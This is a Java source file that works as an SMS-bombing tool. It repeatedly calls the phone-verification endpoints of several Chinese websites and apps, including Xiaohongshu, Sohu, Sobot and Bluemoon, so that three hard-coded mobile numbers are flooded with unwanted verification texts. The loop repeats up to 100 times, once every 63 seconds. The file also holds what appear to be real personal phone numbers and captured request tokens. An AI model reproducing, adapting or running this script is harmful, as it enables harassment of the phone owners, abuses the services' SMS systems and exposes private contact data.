package com.utils.lingfe.testMain;

import cn.hutool.http.HttpUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.utils.DateUtil;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

public class TextMessageCode {

    static class ProPhonInfo{
        public String http;
        public String method;
        public String phone;
        public String url;
        public String param;
        public String name;
    }

    static List<ProPhonInfo> list=new ArrayList<>();
    public static void main(String[] args) throws InterruptedException {
        int i=0;
        while (true){
            String[] phoneS = {"17310677075","15286746188","18585094270"};
            AtomicInteger finalI = new AtomicInteger(i);
            Arrays.stream(phoneS).forEach(p->{
                list.clear();
                addList(p);
                System.out.println("phone="+p);

                //发送请求
                AtomicInteger okNum= new AtomicInteger();
                System.out.println("*********第"+(finalI.get() + 1)+"次*********");
                System.out.println("开始时间:"+ DateUtil.nowDateTimeStr());
                list.forEach(item->{
                    String response="";
                    System.out.println("item:"+JSON.toJSONString(item));

                    try {
                        if("get".equals(item.method)){
                            response =  HttpUtil.get(item.url);
                        }else{
                            response = HttpUtil.post(item.url,item.param);
                        }

                        //验证结果
                        if(response.indexOf("000000")!=-1
                                ||response.indexOf("成功")!=-1){
                            okNum.getAndIncrement();
                        }

                        //输出
                        JSONObject json= JSON.parseObject(response);
                        System.out.println("发送结果:"+JSON.toJSONString(json));
                    } catch (Exception e) { System.out.println("错误:"+e.getMessage());}
                });
                System.out.println("phone="+p+"-成功："+okNum);
                System.out.println();
                finalI.getAndIncrement();
            });

            i++;
            if(i>99)break;
            Thread.sleep(63000);
            System.out.println("\n\n");
        }
    }

    private static void addList(String phone) {
        ProPhonInfo info=new ProPhonInfo();
        info.name="智齿科技";
        info.http="https://www.sobot.com/";
        info.method="get";
        info.url="https://www.sobot.com/basic/reservationSendSms/4?phoneNo="+phone+"&validateFlag=1";
        info.phone = phone;
        info.param=null;
        list.add(info);

        info=new ProPhonInfo();
        info.name="智齿科技";
        info.http="https://www.sobot.com/";
        info.method="get";
        info.url="https://www.soboten.com/basic/registerSendSms/4?phoneNo="+phone+"&validateFlag=2";
        info.phone = phone;
        info.param=null;
        list.add(info);

        info=new ProPhonInfo();
        info.name="可推";
        info.http="https://app.ketui.cn/invite/register?userId=2017114115261696&invitationCode=88888888";
        info.method="get";
        info.url="https://api.ketui.cn/common/sms/captcha/"+phone+"/vh_tker?appVersion=1.0.1&osType=h5&appId=vh";
        info.phone = phone;
        info.param=null;
        list.add(info);

        info=new ProPhonInfo();
        info.name="抓鱼猫";
        info.http="http://k2.illuminspace.com/seller/#/pages/zym/login";
        info.method="get";
        info.url="http://k2.illuminspace.com/api/screenrecord/app/auth/captcha?phoneNumber="+phone;
        info.phone = phone;
        info.param=null;
        list.add(info);

        info=new ProPhonInfo();
        info.name="小红书";
        info.http="https://creator.xiaohongshu.com/login?lastUrl=%252Fpublish%252Fpublish";
        info.method="get";
        info.url="https://customer.xiaohongshu.com/api/cas/sendCode?phone="+phone+"&zone=86";
        info.phone = phone;
        info.param=null;
        list.add(info);

        info=new ProPhonInfo();
        info.name="蓝月亮";
        info.http="https://srm.bluemoon.com.cn/srm/login";
        info.method="post";
        info.url="https://srm.bluemoon.com.cn/buying-center-control/user/getVerifyCode?version=1.0&cuid=123&format=json&time=1670402160067&sign=2583120d3814f4e8f82010cfdc52762a&client=pc";
        info.phone = phone;
        info.param="{\"codeType\":\"register\",\"mobile\":\""+phone+"\"}";
        list.add(info);

    }

    private static void extracted(String phone) {
        ProPhonInfo info;
        info=new ProPhonInfo();
        info.name="搜狐";
        info.http="https://www.sohu.com/a/110252073_148959";
        info.method="get";
        info.url="https://v4.passport.sohu.com/i/smcode/mobile/v2/signin?captchaType=signin" +
                "&mobile="+ phone +"&way=0&captcha=&validate=&pagetoken=1670398170023&appid=116005&callback=passport405_cb1670398170023&_=1670398187637";
        info.phone = phone;
        info.param=null;
        list.add(info);

        info=new ProPhonInfo();
        info.name="杜村通";
        info.http="http://demo.shecuntong.cn:6705/Authed/DCenter/Index?UserToken=2d1f8e94f0bfee1dd86407254a38f9d2";
        info.method="post";
        info.url="http://demo.shecuntong.cn:6705/BAction/SendMsgNew";
        info.phone = phone;
        info.param="{\"commItemList\":[{\"dbName\":\"Contents\",\"strValue\":\"您的注册验证码是：902157\"},{\"dbName\":\"member_mobile\",\"strValue\":\"15286746188\"},{\"dbName\":\"Infofrom\",\"strValue\":\"sct\"}],\"hformID\":\"\",\"hformIDList\":\"\",\"dataSource\":\"1\",\"tableName\":\"Sms_Task\",\"otherTableDataSourceList\":\"\",\"otherTableNameList\":\"\",\"guid\":\"dd65afd8003ac79a6077f152d6bc096e\",\"logTypeID\":0,\"logTypeName\":\"\",\"logOpMsg\":\"\"}";
        list.add(info);

        info=new ProPhonInfo();
        info.name="凡客网";
        info.http="https://ajz.fkw.com/reg.html?bizType=0";
        info.method="post";
        info.url="https://i.fkw.com/ajax/reg_h.jsp?cmd=sendValidateCode_new&bizType=0";
        info.phone = phone;
        info.param="cacct=15286746188&acctType=1&isResend=true&isNewSms=true&cacctCode=fyuS5Qpr6Ftv5L0l4A575gfM5wkO53YQ2ZsT56r04blH4OqB9b3R58fA6sd65UyH6OK04No%2B9Aa05Xxv3YQY5pYd0yPa%2B9qO1f0vpymQIJDUIfF8q1TPBuYSQwpsSFdclXu2ZRxRJdfZ4UF2mNkfuX0quWp%2BYnlxKNr2sgVQgCw%3D&isMailAcct=false&vc_type=2&checkSign=&isAdSms=false&retryCount=1";
        list.add(info);
    }


}
